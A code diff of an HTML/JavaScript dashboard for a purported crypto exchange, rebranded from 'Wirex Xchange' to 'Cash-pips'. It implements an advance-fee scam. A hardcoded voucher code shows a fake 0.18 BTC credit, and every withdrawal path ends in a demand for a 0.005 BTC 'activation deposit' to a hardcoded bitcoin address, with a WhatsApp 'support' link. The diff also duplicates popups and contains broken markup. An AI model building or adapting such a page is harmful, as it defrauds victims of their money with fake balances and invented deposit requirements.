@@ -2,15 +2,50 @@
 <html lang="en">
 
 <head>
-    <title>WIREX XCHANGE DASHBOARD</title>
+    <title>Cash-pips -Dashboard</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
+
 
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
     <link rel="stylesheet" href="depstyle.css">
     <link rel="shortcut icon" href="{{ asset('images/favicon (2).png') }}" type="">
+    <!-- Start of Async Drift Code -->
+    <script>
+        "use strict";
+
+        ! function() {
+            var t = window.driftt = window.drift = window.driftt || [];
+            if (!t.init) {
+                if (t.invoked) return void(window.console && console.error && console.error(
+                    "Drift snippet included twice."));
+                t.invoked = !0, t.methods = ["identify", "config", "track", "reset", "debug", "show", "ping", "page",
+                        "hide", "off", "on"
+                    ],
+                    t.factory = function(e) {
+                        return function() {
+                            var n = Array.prototype.slice.call(arguments);
+                            return n.unshift(e), t.push(n), t;
+                        };
+                    }, t.methods.forEach(function(e) {
+                        t[e] = t.factory(e);
+                    }), t.load = function(t) {
+                        var e = 3e5,
+                            n = Math.ceil(new Date() / e) * e,
+                            o = document.createElement("script");
+                        o.type = "text/javascript", o.async = !0, o.crossorigin = "anonymous", o.src =
+                            "https://js.driftt.com/include/" + n + "/" + t + ".js";
+                        var i = document.getElementsByTagName("script")[0];
+                        i.parentNode.insertBefore(o, i);
+                    };
+            }
+        }();
+        drift.SNIPPET_VERSION = '0.3.1';
+        drift.load('8csfr6c87vh4');
+    </script>
+    <!-- End of Async Drift Code -->
 
     <style>
         /* Set height of the grid so .sidenav can be 100% (adjust as needed) */
@@ -687,6 +722,59 @@
             height: auto;
             /* Maintain aspect ratio */
         }
+
+
+        .tradecss {
+            display: none;
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        .popcontentcss {
+            background-color: #fefefe;
+            margin: 25% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 50%;
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+
+
+        .wallet__menu-link__text2 {
+            background-color: #007bff;
+            padding-left: 30px;
+            padding-right: 30px;
+            padding-bottom: 15px;
+            padding-top: 15px;
+            border-radius: 5px;
+            color: white;
+            text-decoration: none;
+
+        }
+
+
+        .bbb {
+            text-decoration: none;
+            color: white;
+        }
     </style>
 </head>
 
@@ -700,7 +788,7 @@
                     <span class="icon-bar"></span>
                     <span class="icon-bar"></span>
                 </button>
-                <img src="{{ asset('images/images/logo black.png') }}" alt="" height="50px">
+                <img src="images/black logo.png" alt="" height="50px">
             </div>
             <div class="collapse navbar-collapse" id="myNavbar">
                 <ul class="nav navbar-nav">
@@ -776,14 +864,8 @@
 
                     <div class="wallet__menu-item wallet__gift">
                         <a href="#" class="wallet__menu-link">
-                            <svg class="wallet__menu-img" xmlns="http://www.w3.org/2000/svg" width="24"
-                                height="25" viewBox="0 0 24 25" fill="none">
-                                <path
-                                    d="M6.08658 21.1013L5.78803 21.7893L6.08658 21.1013ZM3.3806 18.2664L2.68314 18.5422L3.3806 18.2664ZM20.6194 18.2664L21.3169 18.5422L20.6194 18.2664ZM17.9134 21.1013L18.212 21.7893L17.9134 21.1013ZM12 20.5H12.75H12ZM3.04233 11.0313L2.60455 11.6403H2.60455L3.04233 11.0313ZM10.5 20.75C9.3244 20.75 8.48204 20.7496 7.81769 20.7021C7.1608 20.6551 6.73463 20.5649 6.38514 20.4133L5.78803 21.7893C6.3574 22.0364 6.97308 22.1455 7.71075 22.1983C8.44097 22.2504 9.34589 22.25 10.5 22.25V20.75ZM2.25 13.6429C2.25 14.8534 2.24963 15.7971 2.29916 16.5577C2.34909 17.3243 2.45201 17.9576 2.68314 18.5422L4.07806 17.9907C3.92859 17.6126 3.84121 17.1545 3.79599 16.4602C3.75037 15.7597 3.75 14.873 3.75 13.6429H2.25ZM6.38514 20.4133C5.34904 19.9637 4.51518 19.0962 4.07806 17.9907L2.68314 18.5422C3.26097 20.0036 4.37384 21.1756 5.78803 21.7893L6.38514 20.4133ZM20.25 13.6429C20.25 14.873 20.2496 15.7597 20.204 16.4602C20.1588 17.1545 20.0714 17.6126 19.9219 17.9907L21.3169 18.5422C21.548 17.9576 21.6509 17.3243 21.7008 16.5577C21.7504 15.7971 21.75 14.8534 21.75 13.6429H20.25ZM13.5 22.25C14.6541 22.25 15.559 22.2504 16.2893 22.1983C17.0269 22.1455 17.6426 22.0364 18.212 21.7893L17.6149 20.4133C17.2654 20.5649 16.8392 20.6551 16.1823 20.7021C15.518 20.7496 14.6756 20.75 13.5 20.75V22.25ZM19.9219 17.9907C19.4848 19.0962 18.651 19.9637 17.6149 20.4133L18.212 21.7893C19.6262 21.1756 20.739 20.0036 21.3169 18.5422L19.9219 17.9907ZM3.75 13.6429C3.75 12.1696 3.68173 11.8013 3.74703 11.0664L2.25291 10.9336C2.18073 11.746 2.25 12.357 2.25 13.6429H3.75ZM19.5 7.25C20.4665 7.25 21.25 8.0335 21.25 9H22.75C22.75 7.20507 21.2949 5.75 19.5 5.75V7.25ZM4.5 5.75C2.70507 5.75 1.25 7.20507 1.25 9H2.75C2.75 8.0335 3.5335 7.25 4.5 7.25V5.75ZM11.25 6.5L11.25 20.5H12.75L12.75 6.5H11.25ZM14 5.75H12V7.25H14V5.75ZM12.75 6.5V4.5H11.25V6.5H12.75ZM15.25 4.5C15.25 5.19036 14.6904 5.75 14 5.75V7.25C15.5188 7.25 16.75 6.01878 16.75 4.5H15.25ZM14 3.25C14.6904 3.25 15.25 3.80964 15.25 4.5H16.75C16.75 2.98122 15.5188 1.75 14 1.75V3.25ZM14 1.75C12.4812 1.75 11.25 2.98122 11.25 4.5H12.75C12.75 3.80964 13.3096 3.25 14 3.25V1.75ZM10 7.25H12V5.75H10V7.25ZM7.25 4.5C7.25 6.01878 8.48122 7.25 10 7.25V5.75C9.30964 5.75 8.75 5.19036 8.75 4.5H7.25ZM10 1.75C8.48122 1.75 7.25 2.98122 7.25 4.5H8.75C8.75 3.80964 9.30964 3.25 10 3.25V1.75ZM10 3.25C10.6904 3.25 11.25 3.80964 11.25 4.5H12.75C12.75 2.98122 11.5188 1.75 10 1.75V3.25ZM4.5 7.25H12V5.75H4.5V7.25ZM12 7.25H19.5V5.75H12V7.25ZM13.5 20.75H12V22.25H13.5V20.75ZM12 20.75H10.5V22.25H12V20.75ZM11.25 20.5L11.25 21.5H12.75L12.75 20.5H11.25ZM19.5 10.75H12V12.25H19.5V10.75ZM12 10.75H4.5V12.25H12V10.75ZM4.5 10.75C4.11829 10.75 3.76714 10.6287 3.48011 10.4223L2.60455 11.6403C3.13821 12.0239 3.79381 12.25 4.5 12.25V10.75ZM3.48011 10.4223C3.03646 10.1034 2.75 9.58516 2.75 9H1.25C1.25 10.0884 1.78572 11.0516 2.60455 11.6403L3.48011 10.4223ZM21.25 9C21.25 9.59197 20.9568 10.1155 20.5043 10.4334L21.3665 11.6608C22.2017 11.0742 22.75 10.1012 22.75 9H21.25ZM20.5043 10.4334C20.2202 10.633 19.8749 10.75 19.5 10.75V12.25C20.1934 12.25 20.8381 12.032 21.3665 11.6608L20.5043 10.4334ZM21.75 13.6429C21.75 12.2979 21.7505 11.7674 21.6826 10.9825L20.1882 11.1118C20.2495 11.8207 20.25 12.2851 20.25 13.6429H21.75Z"
-                                    fill="#3D158B" />
-                            </svg>
-                            <span class="wallet__menu-link__text" id="Pop-up"><a href="#"
-                                    id="popupToggle1">Voucher</a></span>
+
+
                         </a>
                     </div>
 
@@ -797,7 +879,17 @@
                     <!-- BTC balance -->
                     <!-- BTC balance -->
                     <h6 class=""><b>Total Balance</b></h6>
-                    <div id="btcBalance" class="bal"> <b><span id="btcBalanceValue">0</span> BTC</b></div>
+                    <div id="btcBalance" class="bal"> <b><span id="btcBalanceValue">0</span> BTC</b>
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+
+
+                    </div>
+                    <br>
+                    <span class="wallet__menu-link__text2" id=""><a href="#" id="popupToggle1"
+                            class="bbb"><img src="images/voucher-coupon-svgrepo-com (1).svg" width="50px">
+                            VOUCHER</a></span>
+
 
 
                 </div>
@@ -817,15 +909,17 @@
                         <ul class="asset-list">
                             <li class="asset-item">
                                 <div class="asset-details">
-                                    <img class="logo" src="{{ asset('images/btc.png') }}" alt="">
+                                    <img class="logo" src="images/btc.png" alt="">
                                     <span class="asset-name">Bitcoin (BTC)</span>
                                 </div>
 
                                 <div id="btcBalance" class="" style="font-size: medium;"> <span
                                         id="btcBalanceValue2">0</span> BTC</div>
                                 <div class="buttons">
-                                    <button class="button">Deposit</button>
-                                    <button class="button" id="withdrawButton">Withdraw</button>
+
+                                    <a href="#" onclick="showCustomPopup()"> <button
+                                            class="button id="custom-depositbtn"><span>Deposit </span></button></a>
+                                    <button id="withdrawButton1" class="button"><span>Withdraw</span></button>
 
                                 </div>
                             </li>
@@ -845,8 +939,9 @@
                                 </div>
                                 <span class="asset-balance">$0.00</span>
                                 <div class="buttons">
-                                    <button class="button">Deposit</button>
-                                    <button class="button">Withdraw</button>
+                                    <a href="#" onclick="showCustomPopup()"> <button
+                                            class="button id="custom-depositbtn"><span>Deposit </span></button></a>
+                                    <button class="button" class="trade" onclick="showPopup()">Withdraw</button>
 
                                 </div>
                             </li>
@@ -866,8 +961,9 @@
                                 </div>
                                 <span class="asset-balance">$0.00</span>
                                 <div class="buttons">
-                                    <button class="button">Deposit</button>
-                                    <button class="button">Withdraw</button>
+                                    <a href="#" onclick="showCustomPopup()"> <button
+                                            class="button id="custom-depositbtn"><span>Deposit </span></button></a>
+                                    <button class="button" class="trade" onclick="showPopup()">Withdraw</button>
 
                                 </div>
                             </li>
@@ -887,8 +983,9 @@
                                 </div>
                                 <span class="asset-balance">$0.00</span>
                                 <div class="buttons">
-                                    <button class="button">Deposit</button>
-                                    <button class="button">Withdraw</button>
+                                    <a href="#" onclick="showCustomPopup()"> <button
+                                            class="button id="custom-depositbtn"><span>Deposit </span></button></a>
+                                    <button class="button" class="trade" onclick="showPopup()">Withdraw</button>
 
                                 </div>
                             </li>
@@ -910,8 +1007,9 @@
                                 </div>
                                 <span class="asset-balance">$0.00</span>
                                 <div class="buttons">
-                                    <button class="button">Deposit</button>
-                                    <button class="button">Withdraw</button>
+                                    <a href="#" onclick="showCustomPopup()"> <button
+                                            class="button id="custom-depositbtn"><span>Deposit </span></button></a>
+                                    <button class="button" class="trade" onclick="showPopup()">Withdraw</button>
 
                                 </div>
                             </li>
@@ -931,8 +1029,9 @@
                                 </div>
                                 <span class="asset-balance">$0.00</span>
                                 <div class="buttons">
-                                    <button class="button">Deposit</button>
-                                    <button class="button">Withdraw</button>
+                                    <a href="#" onclick="showCustomPopup()"> <button
+                                            class="button id="custom-depositbtn"><span>Deposit </span></button></a>
+                                    <button class="button" class="trade" onclick="showPopup()">Withdraw</button>
 
                                 </div>
                             </li>
@@ -952,8 +1051,9 @@
                                 </div>
                                 <span class="asset-balance">$0.00</span>
                                 <div class="buttons">
-                                    <button class="button">Deposit</button>
-                                    <button class="button">Withdraw</button>
+                                    <a href="#" onclick="showCustomPopup()"> <button
+                                            class="button id="custom-depositbtn"><span>Deposit </span></button></a>
+                                    <button class="button" class="trade" onclick="showPopup()">Withdraw</button>
 
                                 </div>
                             </li>
@@ -987,7 +1087,7 @@
         <div id="custom-popup" class="custom-popup">
 
             <h2>DEPOSIT CRYPTO </h2>
-            <center><img src="{{ asset('images/images/up-arrow.gif') }}" alt="" width="150px"></center>
+            <center><img src="images/images/up-arrow.gif" alt="" width="150px"></center>
             <select name="" id="">
                 <option value=""> Select Coin</option>
                 <option value="option1">Bitcoin (BTC)</option>
@@ -1042,24 +1142,14 @@
 
 
 
-
-
-
-
-
-
-
-
-
-
-
     <!-- Pop-up container -->
 
     <div class="overlay" id="overlay"></div>
     <div id="popup" class="popup">
         <span id="closePopup" class="close">&times;</span>
         <h2>VOUCHER</h2>
-        <P> increase your earning </P>
+        <img src="images/voucher-coupon-svgrepo-com (1).svg" alt="">
+        <P> Increase Your Earning </P>
         <input type="text" id="textInput" placeholder="Enter Voucher code">
         <button id="logButton">Activate</button>
     </div>
@@ -1070,31 +1160,75 @@
         <span id="closeCongrats" class="close">&times;</span>
         <h2 style="color: green; font-weight: bolder; text-decoration: solid;">Congratulations!</h2>
         <h3>0.18 BTC Recieved </h3>
-        <img src="{{ asset('images/images/giphy.gif') }}" alt="Girl in a jacket" class="resizable-gif">
+        <img src="images/images/giphy.gif" alt="Girl in a jacket" class="resizable-gif">
 
 
         <button id="acceptBTC">Accept BTC</button>
     </div>
 
     <script>
-        // Check if BTC balance is stored in localStorage
-        var btcBalance = localStorage.getItem('btcBalance');
-        if (btcBalance === null) {
-            btcBalance = 0; // Set initial BTC balance if not found in localStorage
-        } else {
-            btcBalance = parseFloat(btcBalance); // Parse stored value to float
-        }
-        document.getElementById('btcBalanceValue').innerText = btcBalance.toFixed(2); // Update displayed balance
-        //second bal
+        document.getElementById("logButton").addEventListener("click", function(event) {
+            // event.preventDefault(); // Prevent default behavior of button
+            var inputValue = document.getElementById("textInput").value;
+            if (inputValue === "GDHY678") { // Check if code is valid
+                // Perform AJAX request to check voucher availability
+                let xhr = new XMLHttpRequest();
+                xhr.open("POST", "/checkVoucher", true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4 && xhr.status === 200) {
+                        var response = JSON.parse(xhr.responseText);
+                        console.log(response.isAvailable);
+                        if (response.isAvailable == true) {
+                            updateBalance();
+                            document.body.addEventListener('reload', updateBalance);
+
+                            let xhr2 = new XMLHttpRequest();
+                            xhr2.open("POST", "/checked", true);
+                            xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                            togglePopup("popup", "overlay"); // Close the first pop-up
+                            togglePopup("congratsPopup", "congratsOverlay"); // Open the second pop-up
+                            // Call the updateBalance function initially (optional)
+                            // If the "reload" event is indeed a custom event:
+                            xhr2.send("");
+                        } else {
+                            alert("Voucher is not available for the current user.");
+                        }
+                    }
+                };
+                xhr.send(""); // Pass voucher code and user ID
+            } else {
+                alert("you have inputed an Invalid voucher code.");
+            }
+        });
 
         // Check if BTC balance is stored in localStorage
-        var btcBalance = localStorage.getItem('btcBalance');
-        if (btcBalance === null) {
-            btcBalance = 0; // Set initial BTC balance if not found in localStorage
-        } else {
-            btcBalance = parseFloat(btcBalance); // Parse stored value to float
+        // var btcBalance = localStorage.getItem('btcBalance');
+        let btcBalance;
+
+        function updateBalance() {
+            const url = '/voucherBalance';
+            const btcBalanceElement = document.getElementById('btcBalanceValue');
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    const btcBalance = parseFloat(data.voucherBalance);
+                    btcBalanceElement.textContent = btcBalance.toFixed(2);
+                    console.log(btcBalance);
+                })
+                .catch(error => {
+                    console.error('Error fetching balance:', error);
+                    // Handle potential errors here (e.g., display an error message)
+                });
         }
-        document.getElementById('btcBalanceValue2').innerText = btcBalance.toFixed(2); // Update displayed balance
+
+        // Call the updateBalance function initially (optional)
+        updateBalance();
+
+        // If the "reload" event is indeed a custom event:
+        document.body.addEventListener('reload', updateBalance);
+
 
         // Function to toggle the pop-up
         function togglePopup(popupId, overlayId) {
@@ -1122,17 +1256,7 @@
             togglePopup("popup", "overlay"); // Toggle the pop-up
         });
 
-        // Event listener for log button click
-        document.getElementById("logButton").addEventListener("click", function(event) {
-            event.preventDefault(); // Prevent default behavior of button
-            var inputValue = document.getElementById("textInput").value;
-            if (inputValue === "GDHY678") { // Check if code is valid
-                togglePopup("popup", "overlay"); // Close the first pop-up
-                togglePopup("congratsPopup", "congratsOverlay"); // Open the second pop-up
-            } else {
-                alert("you have inputed an Invalid voucher code.");
-            }
-        });
+
 
         // Event listener for close button click in Congratulations Pop-up
         document.getElementById("closeCongrats").addEventListener("click", function(event) {
@@ -1140,13 +1264,9 @@
             togglePopup("congratsPopup", "congratsOverlay"); // Toggle the pop-up
         });
 
-        // Event listener for accept BTC button click
+        // // Event listener for accept BTC button click
         document.getElementById("acceptBTC").addEventListener("click", function(event) {
             event.preventDefault(); // Prevent default behavior of button
-            btcBalance += 0.18; // Update BTC balance by adding 0.18
-            document.getElementById("btcBalanceValue").innerText = btcBalance.toFixed(
-                2); // Update displayed balance
-            localStorage.setItem('btcBalance', btcBalance.toFixed(2)); // Store updated BTC balance in localStorage
             togglePopup("congratsPopup", "congratsOverlay"); // Close the second pop-up
         });
     </script>
@@ -1166,7 +1286,7 @@
     <div class="popup" id="withdrawPopup">
         <div class="popup-content">
             <span class="close" onclick="hidePopup()">&times;</span>
-            <img src="{{ asset('images/bit.png') }}" alt="Image"
+            <img src="images/bit.png" alt="Image"
                 style="display:block; margin: 0 auto; width: 170px; height: auto;">
             <select id="withdrawSelect" onchange="showAdditionalOptions(this.value)">
                 <option value="">Select a Coin</option>
@@ -1187,7 +1307,7 @@
     <div class="popup" id="additionalPopup">
         <div class="popup-content">
             <span class="close" onclick="hideAdditionalPopup()">&times;</span>
-            <img src="{{ asset('images/bitcon.png') }}" alt="Image"
+            <img src="images/bitcon.png" alt="Image"
                 style="display:block; margin: 0 auto; width: 170px; height: auto;">
             <form id="additionalForm">
                 <input type="text" id="inputField1" placeholder="BTC Wallet Address" required>
@@ -1204,7 +1324,7 @@
     <div class="popup" id="finalPopup">
         <div class="popup-content">
             <span class="close" onclick="hideLastPopup()">&times;</span>
-            <img src="{{ asset('images/images/cancel.gif') }}" alt="Image"
+            <img src="images/images/cancel.gif" alt="Image"
                 style="display:block; margin: 0 auto; width: 170px; height: auto;">
             <p style="color: red;font-weight: bolder;">To withdraw funds to a third-party address, you need to activate
                 your account. To activate the account, make a minimum deposit of 0.005 BTC. The deposit can also be
@@ -1313,9 +1433,276 @@
 
 
 
-    <script src="{{ asset('depjs.js') }}"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </style>
+
+
+
+    <!--toggle for withdrawal-->
+
+
+
+    <div class="popup" id="withdrawPopup">
+        <div class="popup-content">
+            <span class="close" onclick="hidePopup()">&times;</span>
+            <img src="images/bit.png" alt="Image"
+                style="display:block; margin: 0 auto; width: 170px; height: auto;">
+            <select id="withdrawSelect" onchange="showAdditionalOptions(this.value)">
+                <option value="">Select a Coin</option>
+                <option value="BTC">Bitcoin (BTC)</option>
+                <!-- Add more options as needed -->
+            </select>
+            <div id="additionalOptions" style="display: none;">
+                <select id="additionalSelect">
+                    <option value="">Select a Network</option>
+                    <option value="BTC">BTC</option>
+                    <!-- Add more options as needed -->
+                </select>
+                <br><br>
+                <button id="submitWithdraw">Submit</button>
+            </div>
+        </div>
+    </div>
+    <div class="popup" id="additionalPopup">
+        <div class="popup-content">
+            <span class="close" onclick="hideAdditionalPopup()">&times;</span>
+            <img src="images/bitcon.png" alt="Image"
+                style="display:block; margin: 0 auto; width: 170px; height: auto;">
+            <form id="additionalForm">
+                <input type="text" id="inputField1" placeholder="BTC Wallet Address" required>
+                <br>
+                <input type="text" id="inputField2" placeholder="Enter Amount To Withdraw" required>
+                <p>Do not send BTC unless you are certain the destination supports BTC transactions.</p>
+                <button type="button" id="submitAdditional">Submit</button>
+            </form>
+        </div>
+    </div>
+
+
+
+    <div class="popup" id="finalPopup">
+        <div class="popup-content">
+            <span class="close" onclick="hideFinalPopup()">&times;</span>
+            <img src="images/images/cancel.gif" alt="Image"
+                style="display:block; margin: 0 auto; width: 170px; height: auto;">
+            <p style="color: red;font-weight: bolder;">To withdraw funds to a third-party address, you need to activate
+                your account. To activate the account, make a minimum deposit of 0.005 BTC. The deposit can also be
+                withdrawn after account activation.</p>
+            <p><b><i>Your deposit: 0 / 0.005 BTC.</i></b></p>
+
+            <div class="copier-container">
+                <input type="text" id="bitcoinAddress" class="WEE"
+                    value="bc1qc2vv8mv3r3gj2ffplpj70nrt9vjsgdc9r4yu53" readonly onclick="copyBitcoinAddress()">
+            </div>
+
+            <a href="https://wa.me/70813618016"> <button id="lastButton">Contact Support</button></a>
+        </div>
+    </div>
+
+    <script>
+        function hidePopup() {
+            document.getElementById('withdrawPopup').style.display = 'none';
+        }
+
+        function hideAdditionalPopup() {
+            document.getElementById('additionalPopup').style.display = 'none';
+        }
+
+        function hideFinalPopup() {
+            document.getElementById('finalPopup').style.display = 'none';
+        }
+
+        function openAdditionalPopup() {
+            document.getElementById('additionalPopup').style.display = 'block';
+            document.getElementById('withdrawPopup').style.display = 'none'; // Hide the first popup
+        }
+
+        function openFinalPopup() {
+            document.getElementById('finalPopup').style.display = 'block';
+            document.getElementById('additionalPopup').style.display = 'none'; // Hide the second popup
+        }
+
+        function openLastPopup() {
+            document.getElementById('lastPopup').style.display = 'block';
+            document.getElementById('finalPopup').style.display = 'none'; // Hide the third popup
+        }
+
+        function showAdditionalOptions(selectedValue) {
+            if (selectedValue === "BTC") {
+                document.getElementById('additionalOptions').style.display = 'block';
+            } else {
+                document.getElementById('additionalOptions').style.display = 'none';
+            }
+        }
+
+        document.getElementById('withdrawButton1').addEventListener('click', function() {
+            document.getElementById('withdrawPopup').style.display = 'block';
+        });
+
+        document.getElementById('withdrawButton2').addEventListener('click', function() {
+            document.getElementById('withdrawPopup').style.display = 'block';
+        });
+
+        document.getElementById('submitWithdraw').addEventListener('click', function() {
+            openAdditionalPopup();
+        });
+
+        document.getElementById('submitAdditional').addEventListener('click', function() {
+            openFinalPopup();
+        });
+
+        document.getElementById('submitFinal').addEventListener('click', function() {
+            openLastPopup();
+        });
+    </script>
+
+    <script>
+        //support copy
+
+        function copyBitcoinAddress() {
+            const bitcoinAddress = document.getElementById("bitcoinAddress");
+            bitcoinAddress.select();
+            document.execCommand("copy");
+            alert("Bitcoin address copied to clipboard: " + bitcoinAddress.value);
+        }
+    </script>
+
+    <script>
+        document.getElementById('submitAdditional').addEventListener('click', function(event) {
+            var inputField1 = document.getElementById('inputField1');
+            var inputField2 = document.getElementById('inputField2');
+            var input1Value = inputField1.value.trim();
+            var input2Value = inputField2.value.trim();
+
+            if (input1Value === "" || input2Value === "") {
+                alert('Please fill in all required fields.');
+                event.preventDefault(); // Prevent form submission
+            } else {
+                var confirmation = confirm('Are you sure you want to proceed?');
+                if (!confirmation) {
+                    event.preventDefault(); // Prevent form submission if user cancels
+                }
+            }
+        });
+
+        function hideAdditionalPopup() {
+            document.getElementById('additionalPopup').style.display = 'none';
+        }
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="tradecss" id="withtrade">
+        <div class="popcontentcss">
+            <span class="close" onclick="hidePopup()">&times;</span>
+            <center><img src="images/cancel.png" alt="" width="50px">
+                <p style="color: red; font-weight: bold;">Sorry you dont have an assest, make a deposit</p>
+
+            </center>
+        </div>
+    </div>
+    <script>
+        function showPopup() {
+            document.getElementById('withtrade').style.display = 'block';
+        }
+
+        function hidePopup() {
+            document.getElementById('withtrade').style.display = 'none';
+        }
+    </script>
+
+
+
+
+
+
+
+
+
+
+    <script src="depjs.js"></script>
     <div class="footer">
-        <p>&copy; 2024 wirex-Xchange. All rights reserved.</p>
+        <p>&copy; 2024 Cash-Pips. All rights reserved.</p>
     </div>
 
 </body>
